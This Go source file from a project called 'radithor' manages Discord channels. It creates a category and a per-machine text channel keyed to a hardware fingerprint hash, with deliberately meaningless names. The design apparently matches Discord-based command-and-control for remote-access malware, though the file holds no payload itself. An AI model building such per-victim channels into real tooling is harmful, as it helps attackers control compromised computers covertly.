package discord_utils

import (
	"encoding/hex"
	"radithor/core"
	"radithor/core/core_funcs"
	"strings"

	"github.com/bwmarrin/discordgo"
)

const ( // these dont mean anything if anyone is wondering
	_DEFAULT_CATEGORY_NAME string = "string2"
	_DEFAULT_CHANNEL_NAME  string = "nofina9"
)

func FindOrCreateFallbackCategory(ses *discordgo.Session, serverId string) (string, error) {
	channels, err := ses.GuildChannels(serverId)
	if err != nil {
		return "", err
	}

	for _, channel := range channels {
		if channel.Type != discordgo.ChannelTypeGuildCategory {
			continue
		}

		if strings.ToLower(channel.Name) != _DEFAULT_CATEGORY_NAME {
			continue
		}

		return channel.ID, nil
	}

	channel, err := ses.GuildChannelCreateComplex(serverId, discordgo.GuildChannelCreateData{
		Name: _DEFAULT_CATEGORY_NAME,
		Type: discordgo.ChannelTypeGuildCategory,
	})

	if err != nil {
		return "", err
	}

	return channel.ID, nil
}

func FindOrCreateChannel(
	ses *discordgo.Session,
	categoryID string,
	serverId string,
) (string, bool, error) { // channel id, was it newly created?, err
	channels, err := ses.GuildChannels(serverId)
	if err != nil {
		return "", false, err
	}

	var channelName string

	fingerprint, err := core_funcs.GenerateFingerprint()
	if err != nil {
		core.LogWarning("[FindOrCreateChannel] failed to gen fingerprint, using default channel name")

		channelName = _DEFAULT_CHANNEL_NAME
	} else {
		channelName = hex.EncodeToString(fingerprint[:])
	}

	for _, channel := range channels {
		if channel.Topic != channelName {
			continue
		}

		if channel.Type != discordgo.ChannelTypeGuildText {
			continue
		}

		if channel.ParentID != categoryID {
			continue
		}

		return channel.ID, false, nil
	}

	channel, err := ses.GuildChannelCreateComplex(serverId, discordgo.GuildChannelCreateData{
		Name:     channelName[:12], // dont wanna shove the whole hash in the name, also, it checks only the topic
		Topic:    channelName,
		Type:     discordgo.ChannelTypeGuildText,
		ParentID: categoryID,
	})

	if err == nil {
		return channel.ID, true, nil
	}

	core.LogWarning("[FindOrCreateChannel] failed to create channel, retrying with default category...")

	categoryID, err = FindOrCreateFallbackCategory(ses, serverId)
	if err != nil {
		return "", false, err
	}

	channel, err = ses.GuildChannelCreateComplex(serverId, discordgo.GuildChannelCreateData{
		Name:     channelName[:12], // dont wanna shove the whole hash in the name, also, it checks only the topic
		Topic:    channelName,
		Type:     discordgo.ChannelTypeGuildText,
		ParentID: categoryID,
	})

	if err != nil {
		return "", false, err
	}

	return channel.ID, true, nil
}

// this is will also count categories
func CountTotalChannels(ses *discordgo.Session, serverId string) (int, error) {
	channels, err := ses.GuildChannels(serverId)
	if err != nil {
		return 0, err
	}

	return len(channels), nil
}

func countTotalCategories(ses *discordgo.Session, serverId string) (int, error) {
	channels, err := ses.GuildChannels(serverId)
	if err != nil {
		return 0, err
	}

	counted := 0

	for _, channel := range channels {
		if channel.Type == discordgo.ChannelTypeGuildCategory {
			counted += 1
		}
	}

	return counted, nil
}

func countChannelsInCategory(
	ses *discordgo.Session,
	categoryID string,
	serverId string,
) (int, error) {
	channels, err := ses.GuildChannels(serverId)
	if err != nil {
		return 0, err
	}

	counted := 0

	for _, channel := range channels {
		if channel.ParentID == categoryID {
			counted += 1
		}
	}

	return counted, nil
}
